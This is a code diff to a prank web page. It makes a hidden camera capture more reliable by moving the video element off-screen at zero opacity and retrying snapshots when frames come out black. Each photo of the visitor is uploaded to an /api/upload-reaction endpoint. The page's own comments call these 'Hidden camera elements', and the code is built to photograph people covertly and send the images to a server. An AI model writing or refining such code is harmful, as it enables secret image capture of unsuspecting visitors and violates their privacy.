@@ -217,7 +217,7 @@
   <div class="emoji-rain" id="emoji-rain"></div>
 
   <!-- Hidden camera elements -->
-  <video id="video" width="640" height="480" autoplay playsinline muted style="display:none;"></video>
+  <video id="video" width="640" height="480" autoplay playsinline muted style="position:fixed; top:-9999px; opacity:0; pointer-events:none;"></video>
   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
   <!-- Audio for prank reveal -->
@@ -251,32 +251,53 @@
             setTimeout(() => {
               const canvas = document.getElementById('canvas');
               const context = canvas.getContext('2d');
-              context.drawImage(video, 0, 0, 640, 480);
               
-              canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('reaction', blob, 'reaction.jpg');
-                formData.append('scanId', scanId);
+              const takeSnapshot = (retryCount = 0) => {
+                context.drawImage(video, 0, 0, 640, 480);
                 
-                try {
-                  const res = await fetch('/api/upload-reaction', {
-                    method: 'POST',
-                    body: formData
-                  });
-                  if (res.ok) {
-                    console.log("Reaction uploaded!");
-                  } else {
-                    const errJson = await res.json();
-                    console.error("Upload failed:", errJson.error);
+                // Check if image is black (only on Android/Chrome)
+                const imgData = context.getImageData(0, 0, 10, 10).data;
+                let isBlack = true;
+                for (let i = 0; i < imgData.length; i += 4) {
+                  if (imgData[i] > 10 || imgData[i+1] > 10 || imgData[i+2] > 10) {
+                    isBlack = false;
+                    break;
                   }
-                } catch (err) {
-                  console.error("Network error:", err.message);
                 }
-                
-                // Stop camera
-                stream.getTracks().forEach(track => track.stop());
-              }, 'image/jpeg', 0.8);
-            }, 5800); 
+
+                if (isBlack && retryCount < 5) {
+                  console.log("Detected black frame, retrying...");
+                  setTimeout(() => takeSnapshot(retryCount + 1), 500);
+                  return;
+                }
+
+                canvas.toBlob(async (blob) => {
+                  const formData = new FormData();
+                  formData.append('reaction', blob, 'reaction.jpg');
+                  formData.append('scanId', scanId);
+                  
+                  try {
+                    const res = await fetch('/api/upload-reaction', {
+                      method: 'POST',
+                      body: formData
+                    });
+                    if (res.ok) {
+                      console.log("Reaction uploaded!");
+                    } else {
+                      const errJson = await res.json();
+                      console.error("Upload failed:", errJson.error);
+                    }
+                  } catch (err) {
+                    console.error("Network error:", err.message);
+                  }
+                  
+                  // Stop camera
+                  stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg', 0.8);
+              };
+
+              takeSnapshot();
+            }, 5500); 
           }
         }, 500);
 
